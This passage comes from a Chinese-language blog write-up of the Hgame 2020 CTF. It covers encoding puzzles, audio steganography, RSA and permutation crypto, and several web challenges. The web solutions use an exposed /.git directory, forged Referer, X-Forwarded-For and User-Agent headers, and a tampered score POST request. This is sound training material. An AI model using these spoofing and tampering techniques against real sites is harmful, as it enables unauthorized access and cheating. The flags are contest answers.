punctuation">.</span>join<span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token string">'SCGEAORNGSHBECEAASRIFHGREOTEO'</span></code></pre><p><strong>20200125 更新：</strong></p><p>看了官方WP才知道<code>Bancon</code>指的是培根密码，我还以为是咸肉/熏猪肉来着。。</p><p>根据大小写转为a或b，比如小写为a，大写为b。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_kesulu2.png" alt="官方WP"></p><p>flag隐藏在最后emmm</p><p>Ctrl+D把隐藏取消掉就看到了。</p><p><code>hgame{Y0u_h@Ve_F0Und_mY_S3cReT}</code></p><hr><h3 id="签到题ProPlus"><a href="#签到题ProPlus" class="headerlink" title="签到题ProPlus"></a>签到题ProPlus</h3><p><code>Password.txt</code>提示了</p><pre><code>Rdjxfwxjfimkn z,ts wntzi xtjrwm xsfjt jm ywt rtntwhf f y   h jnsxf qjFjf jnb  rg fiyykwtbsnkm tm  xa jsdwqjfmkjy wlviHtqzqsGsffywjjyynf yssm xfjypnyihjn.JRFVJYFZVRUAGMAI</code></pre><blockquote><ul><li>Three fences first, Five Caesar next. English sentense first,  zip password next.</li></ul></blockquote><p>一开始还以为前面的是3个栅栏，后面的是5个凯撒，然后试了半天都不对。</p><p>突然一想应该是先栅栏再凯撒，一试果然。</p><p>先解密zip密码：栅栏得到<code>JFARZGFVMVRAJUIY</code>，凯撒得到密码 <code>EAVMUBAQHQMVEPDT</code>。解压得到 <code>OK.txt</code>。</p><p>同时上面的那句话同理解密得到</p><blockquote><p>Many years later as he faced the firing squad, Colonel Aureliano Buendia was to remember that distant afternoon when his father took him to discover ice.</p></blockquote><p>emmm不大理解，不管了。</p><p>看文件是Ook!编码，解密得到base32编码。</p><pre><code>data:text;basecode></pre><p>再base32解密得到</p><pre><code>iVBORw0KGgoAAAANSUhEUgAAAQQAAAEECAYAAADOCEoKAAAOWUlEQVR4nO2aS64ENwwD3/0v7WyCSW8GcE8okbKrAO8a+lASV/23AAD+5c9dAADkgCEAwAcMAQA+YAgA8AFDAIAPGAIAfMAQAOADhgAAH7YM4e/vj/d40gE059vNmaxZao/Jb1s3xK0TV6WtmumapfaY/LZ1Q9w6cVXaqpmuWWqPyW9bN8StE1elrZrpmqX2mPy2dUPcOnFV2qqZrllqj8lvWzfErRNXpa2a6Zql9pj8tnVD3DpxVdqqma5Zao/Jb1s3xK0TV6WtmumapfaY/LZ1Q9w6cVXaqpmuWWqPyW9bN8StE1elrZrpmqX2mPy2dVOKOx1lnw7NLAsUutzsLIbwv5m+kBjC+7qmgyEUMn0hMYT3dU0HQyhk+kJiCO/rmg6GUMj0hcQQ3tc1HQyhkOkLiSG8r2s6GEIh0xcSQ3hf13QwhEKmLySG8L6u6WAIhUxfSAzhfV3TGW8IqQt0Qp8OzVJx7Ub3DOR9didNFfaEPh2apeLaje4ZyPvsTpoq7Al9OjRLxbUb3TOQ99mdNFXYE/p0aJaKaze6ZyDvsztpqrAn9OnQLBXXbnTPQN5nd9JUYU/o06FZKq7d6J6BvM/upKnCntCnQ7NUXLvRPQN5n91JU4U9oU+HZqm4dqN7BvI+u5OmCntCnw7NUnHtRvcM5H12J00V9oQ+HZql4tqN7hnI++xOmiqsuk91ztRFc2imrF8dL3VO2312J00VVt2nOmfqojk0U9avjpc6p+0+u5OmCqvuU50zddEcminrV8dLndN2n91JU4VV96nOmbpoDs2U9avjpc5pu8/upKnCqvtU50xdNIdmyvrV8VLntN1nd9JUYdV9qnOmLppDM2X96nipc9rusztpqrDqPtU5UxfNoZmyfnW81Dlt99mdNFVYdZ/qnKmL5tBMWb86XuqctvvsTpoqrLpPdc7URXNopqxfHS91Ttt9didNFVbdpzpn6qI5NFPWr46XOqftPruTpgrr6vMWxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3mIIGMJIxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3mIIGMJIxh9K6N5iCBjCSMYfSujeYggYwkjGH0ro3o43hGQcg0o1NDXddSVroQRDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqAFDKARDqANDqCHaEG553YNyGIcyVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL254n4taImxprN54yVrJmt7zteSJujbipsXbjKWMla3bL257n9pfwCscwlbU5+nTpAf+BukUkHwCGAN9A3SKSDwBDgG+gbhHJB4AhwDdQt4jkA8AQ4BuoW0TyAWAI8A3ULSL5ADAE+AbqFpF8ABgCfAN1i0g+AAwBvtH+p+J2YYblSF1al7bdejhiJe92956thSHY+1TW5ehTWZsjVvJud+/ZWhiCvU9lXY4+lbU5YiXvdveerYUh2PtU1uXoU1mbI1bybnfv2VoYgr1PZV2OPpW1OWIl73b3nq2FIdj7VNbl6FNZmyNW8m5379laGIK9T2Vdjj6VtTliJe92956thSHY+1TW5ehTWZsjVvJud+/ZWhiCvU9lXY4+lbU5YiXvdveerYUh2PtU1uXoU1mbI1bybnfv2VpiQ1DGihYt9FBcenT30J1PnTNVs7UwhJ9IXTSXHt09dOdT50zVbC0M4SdSF82lR3cP3fnUOVM1WwtD+InURXPp0d1Ddz51zlTN1sIQfiJ10Vx6dPfQnU+dM1WztTCEn0hdNJce3T1051PnTNVsLQzhJ1IXzaVHdw/d+dQ5UzVbC0P4idRFc+nR3UN3PnXOVM3WwhB+InXRXHp099CdT50zVbO1Ng1BSfKgLAMw5HRopszZHWuXE3YDQyh6Dj2UJM+pO9YuJ+wGhlD0HHooSZ5Td6xdTtgNDKHoOfRQkjyn7li7nLAbGELRc+ihJHlO3bF2OWE3MISi59BDSfKcumPtcsJuYAhFz6GHkuQ5dcfa5YTdwBCKnkMPJclz6o61ywm7gSEUPYceSpLn1B1rlxN2A0Moeg49lCTPqTvWLifsRvuvy9uFhR7Kbm3JpGqbnDN1zzCEIYNKJlXb5Jype4YhDBlUMqnaJudM3TMMYcigkknVNjln6p5hCEMGlUyqtsk5U/cMQxgyqGRStU3OmbpnGMKQQSWTqm1yztQ9wxCGDCqZVG2Tc6buGYYwZFDJpGqbnDN1zzCEIYNKJlXb5Jype3aNIThQ9pm83A6kSxt8xEowBDMYQh0YwnswBDMYQh0YwnswBDMYQh0YwnswBDMYQh0YwnswBDMYQh0YwnswBDMYQh0YwnswBDMYQh0YwnswBDMYQh0YwntiDUHZgDLWCcdpGXpozhO0VWKZU3cDyli78RxDT17a1JwnaKvEMqfuBpSxduM5hp68tKk5T9BWiWVO3Q0oY+3Gcww9eWlTc56grRLLnLobUMbajecYevLSpuY8QVslljl1N6CMtRvPMfTkpU3NeYK2Sixz6m5AGWs3nmPoyUubmvMEbZVY5tTdgDLWbjzH0JOXNjXnCdoqscypuwFlrN14jqEnL21qzhO0VWKZU3cDyli78RxDT17a1JwnaKvEMidlYd1NnpBTyXTNlMgPRaxH6p5hCEMG1Z3ToZkS+aGI9UjdMwxhyKC6czo0UyI/FLEeqXuGIQwZVHdOh2ZK5Ici1iN1zzCEIYPqzunQTIn8UMR6pO4ZhjBkUN05HZopkR+KWI/UPcMQhgyqO6dDMyXyQxHrkbpnGMKQQXXndGimRH4oYj1S9wxDGDKo7pwOzZTID0WsR+qeYQhDBtWd06GZEvmhiPVI3bP2X5dPEO2GnMn1d9e1W9sROaXBMIRjcibXf81xYggYQkrO5PqvOU4MAUNIyZlc/zXHiSFgCCk5k+u/5jgxBAwhJWdy/dccJ4aAIaTkTK7/muPEEDCElJzJ9V9znBgChpCSM7n+a44z1RCmD8rxHPUn5+yu64SZO8AQhizH9JzddZ0wcwcYwpDlmJ6zu64TZu4AQxiyHNNzdtd1wswdYAhDlmN6zu66Tpi5AwxhyHJMz9ld1wkzd4AhDFmO6Tm76zph5g4whCHLMT1nd10nzNwBhjBkOabn7K7rhJk7wBCGLMf0nN11nTBzB56sF8Ci/Vbb5PpT63q1Q4W1Xg2G8Fttk+tPrQtDCABD+K22yfWn1oUhBIAh/Fbb5PpT68IQAsAQfqttcv2pdWEIAWAIv9U2uf7UujCEADCE32qbXH9qXRhCABjCb7VNrj+1LgwhAAzht9om159al9wQlMM84XVr5sBRm0N/dW2pb7vPG8RwiOsYphJHbQ791bWlvu0+bxDDIa5jmEoctTn0V9eW+rb7vEEMh7iOYSpx1ObQX11b6tvu8wYxHOI6hqnEUZtDf3VtqW+7zxvEcIjrGKYSR20O/dW1pb7tPm8QwyGuY5hKHLU59FfXlvq2+7xBDIe4jmEqcdTm0F9dW+rb7vMGMRziOoapxFGbQ391balvu88bxHCI6ximEkdtDv3VtaW+7T4d4qaSegTq+h05u2OpuUUzDOEBhnDWciu5RTMM4QGGcNZyK7lFMwzhAYZw1nIruUUzDOEBhnDWciu5RTMM4QGGcNZyK7lFMwzhAYZw1nIruUUzDOEBhnDWciu5RTMM4QGGcNZyK7lFMwzhAYZw1nIruUWzdkNQLm3ycitzqut3aJtaf7Jm3fqvhSGU9anMqa7foW1q/cmadeu/FoZQ1qcyp7p+h7ap9Sdr1q3/WhhCWZ/KnOr6Hdqm1p+sWbf+a2EIZX0qc6rrd2ibWn+yZt36r4UhlPWpzKmu36Ftav3JmnXrvxaGUNanMqe6foe2qfUna9at/1oYQlmfypzq+h3aptafrFm3/mthCGV9KnOq63dom1p/smbd+q+FIdDnwKckeeYOMAT6HPeUJM/cAYZAn+OekuSZO8AQ6HPcU5I8cwcYAn2Oe0qSZ+4AQ6DPcU9J8swdYAj0Oe4pSZ65AwyBPsc9Jckzd4Ah0Oe4pyR55g4wBPoc95Qkz9wBhlDUZzLug+6Yp2s3xvfZnTRVWHWfybgOefSh3NJnd9JUYdV9JuM65NGHckuf3UlThVX3mYzrkEcfyi19didNFVbdZzKuQx59KLf02Z00VVh1n8m4Dnn0odzSZ3fSVGHVfSbjOuTRh3JLn91JU4VV95mM65BHH8otfXYnTRVW3WcyrkMefSi39NmdNFVYdZ/JuA559KHc0qcjaSqpg3IfYNrr1n+XE+4EQ3iQupDuA0x73frvcsKdYAgPUhfSfYBpr1v/XU64EwzhQepCug8w7XXrv8sJd4IhPEhdSPcBpr1u/Xc54U4whAepC+k+wLTXrf8uJ9wJhvAgdSHdB5j2uvXf5YQ7wRAepC6k+wDTXrf+u5xwJxjCg9SFdB9g2uvWf5cT7kRqCLc8pWZKunt01ebo85qc3YWd8JSaKXEskKM2R5/X5Owu7ISn1EyJY4EctTn6vCZnd2EnPKVmShwL5KjN0ec1ObsLO+EpNVPiWCBHbY4+r8nZXdgJT6mZEscCOWpz9HlNzu7CTnhKzZQ4FshRm6PPa3J2F3bCU2qmxLFAjtocfV6Ts7uwE55SMyWOBXLU5ujzmpzdhZ3wlJopcSyQozZHn9fk3P4SAI4HQwCADxgCAHzAEADgA4YAAB8wBAD4gCEAwAcMAQA+YAgA8AFDAIAP/wAFo0hUZrh1mAAAAABJRU5ErkJggg==</code></pre><p>一看结尾<code>==</code>，应该是base64编码，于是继续解密。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_signinProPlus.png" alt="base64解密"></p><p>噫是个PNG图片。加上头补全 <code>data:image/png;base64,</code>。草（一种植物），真会玩，是个二维码。</p><p>（也可以base64解密后保存为二进制文件然后打开。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_signinProPlus2.png" alt="二维码图片"></p><p>扫码得到flag：</p><p><code>hgame{3Nc0dInG_@lL_iN_0Ne!}</code></p><p>真的会玩2333（（<em>好，我也要整一个各种编码的嘻嘻嘻</em></p><blockquote><p><em>Reference:</em><br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/kaisamima.php</a><br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a>   </p></blockquote><hr><h3 id="每日推荐"><a href="#每日推荐" class="headerlink" title="每日推荐"></a>每日推荐</h3><p>得到一个<code>.pcapng</code>抓包文件，用Wireshark打开，查看http，发现应该是与wordpress博客相关。</p><p>利用“文件-导出对象-HTTP”，分析其中的对象。</p><p>结合题目提示</p><blockquote><p>ObjectNotFound正听着网易云每日推荐…</p></blockquote><p>发现了一个上传的网页——</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation1.png" alt="HTTP对象"></p><p>这是一个提交的表格，发现了上传的文件 <code>song.zip</code>，将其提取出来。</p><p>压缩包里果然是一首歌，且备注里提示是6位数字。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation2.png" alt="form"></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation3.png" alt="压缩包"></p><p>考虑到6位数字，直接就暴力破解好了。（其实还在抓包文件里找了老半天没找到（（（</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation4.png" alt="破解得到口令"></p><p>利用口令<code>759371</code>解压得到mp3文件。</p><p>一开始打开010editor找，没有。</p><p>foremost提取得到了封面图，也没有隐写。</p><p>看来在音频里了，猜想就是<strong>音频隐写</strong>嘛。</p><p>既然是MP3，先试试<code>MP3StegoDecode</code>，结果么得。</p><pre><code>the bit stream file I Love Mondays.mp3 is a BINARY fileHDR: s=FFF, id=1, l=1, ep=on, br=4, sf=3, pd=0, pr=0, m=0, js=0, c=0, o=0, e=0alg.=MPEG-1, layer=I, tot bitrate=128, sfrq=0.0mode=stereo, sblim=32, jsbd=32, ch=2[Frame    3]OpenTable: could not find tables/huffdecCheck local directory './tables/'Please check huffman table 'huffdec'</code></pre><p>上网找了一下，下了个音频处理软件<strong><em>Audacity</em></strong>。（免费开源跨平台，还不错</p><blockquote><p>Free, open source, cross-platform audio software. <em>Audacity</em> is an easy-to-use, multi-track audio editor and recorder for Windows, Mac OS X, GNU/Linux…</p></blockquote><p>查看频谱，得到flag：</p><p><code>hgame{I_love_EDM233}</code></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation5.png" alt="查看频谱图得到flag"></p><blockquote><p><strong><em>Electronic Dance Music</em></strong> <em>（电子舞曲）</em>可还行。</p><p>第一次做音频隐写的题，哇脑洞真大，太有意思了233333</p></blockquote><hr><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><p><a href="http://cosmos.hgame.n3ko.co/" target="_blank" rel="noopener">http://cosmos.hgame.n3ko.co/</a></p><p>先在网页里找了半天没找到emmm</p><p>后来发现，既然说<strong>版本管理工具</strong>，还有<strong>GitHub</strong>嘛。</p><p>那就构造<code>/.git/config</code>试试</p><p>果然——</p><pre><code>[core]    repositoryformatversion = 0    filemode = true    bare = false    logallrefupdates = true[remote "origin"]    url = https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbc    fetch = +refs/heads/*:refs/remotes/origin/*</code></pre><p>好，这个GitHub仓库有戏！</p><p>访问一波，然后在commit里找到了flag。</p><p><img src="/2020/01/23/CTF_Hgame2020/web_Cosmos'sBlog.png" alt="web_Cosmos'sBlog"></p><p>base64解码得到flag</p><p><code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></p><blockquote><p>/.git目录公开访问是挺危险的emmm  </p></blockquote><hr><h3 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h3><p><a href="http://kyaru.hgame.n3ko.co/" target="_blank" rel="noopener">http://kyaru.hgame.n3ko.co/ </a></p><p>直接访问，提示</p><blockquote><p>You need to come from <a href="https://vidar.club/" target="_blank" rel="noopener">https://vidar.club/</a>.                    </p></blockquote><p>增加请求头: <code>Referer: https://vidar.club/</code>，重发后提示</p><blockquote><p>You need to visit it locally.                    </p></blockquote><p>增加请求头：<code>X-Forwarded-For: 127.0.0.1</code></p><blockquote><p>You need to use Cosmos Brower to visit.                    </p></blockquote><p>改UA：<code>User-Agent: Cosmos</code></p><blockquote><p>The flag will be updated after 2077, please wait for it patiently.                    </p></blockquote><p>根据响应头 <code>Last-Modified: Fri, 01 Jan 2077 00:00:00 GMT</code>，进行修改。把 <code>If-Unmodified-Since</code> 设置在 <code>Last-Modified</code> 之后就可以了。</p><p>增加请求头：<code>If-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT</code></p><p>得到flag</p><p><code>hgame{W0w!Your_heads_@re_s0_many!}</code>                    </p><blockquote><p>这题一波三折啊。</p><p>最后这个操作让我想到了ustc的hackgame里<code>信息安全 2077</code>那道题，然后回去看了一下233.</p><p><strong><em>Reference：</em></strong></p><p><a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md" target="_blank" rel="noopener">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md</a></p></blockquote><hr><h3 id="🐔尼泰玫"><a href="#🐔尼泰玫" class="headerlink" title="🐔尼泰玫"></a>🐔尼泰玫</h3><p>cxk有点好玩2333</p><p><del>随便玩了一下觉得有点无聊（x</del></p><p>看了一下网页源代码，发现是用canvas画布画出来的，交互用的js，有点意思i。</p><p>然后打开了Burp Suite，抓个包看看吧。</p><p>发现游戏结束的时候会POST当前得分。</p><p>不够则提示</p><blockquote><p>Your score must more than 30000 , then you can get the flag. Happy game!</p></blockquote><p>那就截包改包好了啦，直接给他加个0.</p><p><img src="/2020/01/23/CTF_Hgame2020/web_cxk1.png" alt="改包"></p><p>这就出来了呀！</p><p><img src="/2020/01/23/CTF_Hgame2020/web_cxk2.png" alt="cxk2"></p><p>​    <code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></p><hr><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><p><a href="http://codeworld.hgame.day-day.work/" target="_blank" rel="noopener">http://codeworld.hgame.day-day.work/</a></p><p>发现重定向到了 <a href="http://codeworld.hgame.day-day.work/new.php" target="_blank" rel="noopener">http://codeworld.hgame.day-day.work/new.php</a></p><p>同时看到了一句js</p><pre class=" language-javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!"</span><span class="token punctuation">)</span></code></pre><p>curl看了一下之前的网页405。</p><p>嘤不会了。。</p><blockquote><p><strong>20200125更新：</strong></p><p>看了官方WP，发现要把请求改成POST发到原页面。</p><p>于是试了一下，返回</p><pre><code>人鸡验证目前它只支持通过url提交参数来计算两个数的相加，参数为a现在,需要让结果为10</code></pre><p>再构造参数a，根据提示<code>参数a的提交格式为: 两数相加(a=b+c)</code>，考虑到<code>+</code>的Urlencode为%2b</p><p>于是构造<code>/?a=2%2b8</code>，得到flag</p><pre><code>The result is: 10hgame{C0d3_1s_s0_S@_sO_C0ol!}</code></pre></blockquote><hr><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>题目给了如下的代码——</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>b<span class="token string">'hgame{'</span><span class="token punctuation">)</span> <span class="token operator">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>b<span class="token string">'}'</span><span class="token punctuation">)</span>m <span class="token operator">=</span> int<span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token number">681782737450022065655472455411</span>q <span class="token operator">=</span> <span class="token number">675274897132088253519831953441</span>e <span class="token operator">=</span> <span class="token number">13</span>c <span class="token operator">=</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">assert</span> c <span class="token operator">==</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span></code></pre><p>RSA啦。这里就<strong>根据密文C把明文M给找出来</strong>。</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_InfantRSA.png" alt="InfantRSA"></p><pre class=" language-python"><code class="language-python">c <span class="token operator">=</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span>n <span class="token operator">=</span> <span class="token number">460390767897997184102969941508880171690097589571068900519251</span>d <span class="token operator">=</span> <span class="token number">141658697814768364339375366617699419709389378231351875726277</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 得到m为39062110472669388914389428064087335236334831991333245</span><span class="token comment" spellcheck="true"># 再将数字m转换为字符串</span>    <span class="token keyword">import</span> binascii    flag <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>或者 用上面的工具里的<em>Test</em>：</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_InfantRSA2.png" alt="test"></p><p>得到flag：</p><p><code>hgame{t3Xt6O0k_R5A!!!}</code></p><blockquote><p><em>Reference:</em>  介绍RSA的<br><a href="https://www.freebuf.com/articles/others-articles/166049.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/166049.html</a><br><a href="https://www.freebuf.com/articles/others-articles/161475.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/others-articles/161475.html</a><br><a href="https://www.k2zone.cn/?p=2157" target="_blank" rel="noopener">https://www.k2zone.cn/?p=2157</a></p></blockquote><hr><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p><code>nc 47.98.192.231 25002</code></p><p>敲个回车就可以得到一个乱序的字符串，刚开始还以为是分组来着，然后试了半天不对emmm。</p><p>后来才发现，原来每次的结果都不一样233，比如下面是一些实验结果。</p><pre><code>Rua!!!$hLjgp+ame{UI5mtA3}u_!iP!RmTn0eT   Rua!!!$mtgIUeapjm{h+5LAeT_nTRP!u!m3i0}  Rua!!!t5m{ag+eh$UjILmpT0!mP_iR3ATun}e!  $mhmjI5te+{apUgLAe3!un0TRimP!T_}  mat5jIpmg$heLU{+!PT0un!e_A3R}Tmi  {LUpt5mI+e$mgajhm}T!T0!niRAe_Pu3  $Umm+g{LIe5jphtaAT!ei_m}nR0u!3TP  5I{eLmt+ha$mgpjU0nmR}eTi3PA!_!uT  Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R</code></pre><p><strong>既然是乱序吧，那就看看到底是什么个顺序好了！</strong></p><p>上面字符串的长度为32，于是构造字符串 </p><p><code>str1='123456abcdefghijklmnopqrstuvwxyz'</code></p><p>输入后得到 <code>str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo'</code>  </p><p>试了发现该顺序不变，于是得到编码的对应关系（正变换逆变换嘛233333）</p><pre class=" language-python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'123456abcdefghijklmnopqrstuvwxyz'</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span>str2<span class="token operator">=</span><span class="token string">'jhca1346ibdefg25zxsqkmnpyrtuvwlo'</span><span class="token comment" spellcheck="true"># 正变换</span>location<span class="token operator">=</span>list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    location<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [15, 13, 8, 6, 0, 2, 3, 5, 14, 7, 9, 10, 11, 12, 1, 4, 31, 29, 24, 22, 16, 18, 19, 21, 30, 23, 25, 26, 27, 28, 17, 20]</span><span class="token comment" spellcheck="true"># 逆变换</span>ilocation<span class="token operator">=</span>list<span class="token punctuation">(</span>range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ilocation<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>str2<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ilocation<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># [4, 14, 5, 6, 15, 7, 3, 9, 2, 10, 11, 12, 13, 1, 8, 0, 20, 30, 21, 22, 31, 23, 19, 25, 18, 26, 27, 28, 29, 17, 24, 16]</span><span class="token comment" spellcheck="true"># 验证结果</span>str3<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>    str3<span class="token operator">+=</span>str1<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str3<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#  jhca1346ibdefg25zxsqkmnpyrtuvwlo</span></code></pre><p>这里用到的是正变换，<strong>暴力破解</strong>一波吧！</p><pre class=" language-python"><code class="language-python">str_encrypted <span class="token operator">=</span> r<span class="token string">'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R'</span>str_decrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>        str_decrypted <span class="token operator">+=</span> str_encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypted<span class="token punctuation">)</span>    str_encrypted <span class="token operator">=</span> str_decrypted    str_decrypted <span class="token operator">=</span> <span class="token string">''</span></code></pre><p>最开始试了50次没出来233，后来把数字改大了一点233.</p><p>终于跑出来了！</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_Reorder.png" alt="crypto_Reorder"></p><p><strong>得到flag：</strong></p><p><code>hgame{jU$t+5ImpL3_PeRmuTATi0n!!}</code></p><blockquote><p><strong>果然就排列呗23333</strong></p></blockquote><p>还试了一下，这个130次一循环来着emmm。就这样，发现range改到131就出现两个了。</p><pre class=" language-python"><code class="language-python">str_encrypted <span class="token operator">=</span> r<span class="token string">'Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R'</span>str_decrypted <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">130</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> location<span class="token punctuation">:</span>        str_decrypted <span class="token operator">+=</span> str_encrypted<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">if</span> str_decrypted<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'hgame'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>str_decrypted<span class="token punctuation">)</span>    str_encrypted <span class="token operator">=</span> str_decrypted    str_decrypted <span class="token operator">=</span> <span class="token string">''</span></code></pre><p><strong>不对唉！</strong>好像没这么简单。重新试了一下之前的几个<code>Rua!!!</code>之后的结果，发现这个变换不可行emmm。</p><p><strong>必须是连续输入上一次出来的结果才行。<em>（可能理解有误</em></strong></p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_Reorder2.png" alt="crypto_Reorder2"></p><hr><h3 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h3><p>题目给了这段用来加密的代码，现在就想办法还原回去找flag吧。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> gmpy2<span class="token keyword">from</span> secret <span class="token keyword">import</span> A<span class="token punctuation">,</span> B<span class="token punctuation">,</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'hgame{'</span><span class="token punctuation">)</span> <span class="token operator">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'}'</span><span class="token punctuation">)</span>TABLE <span class="token operator">=</span> <span class="token string">'zxcvbnmasdfghjklqwertyuiop1234567890QWERTYUIOPASDFGHJKLZXCVBNM'</span>MOD <span class="token operator">=</span> len<span class="token 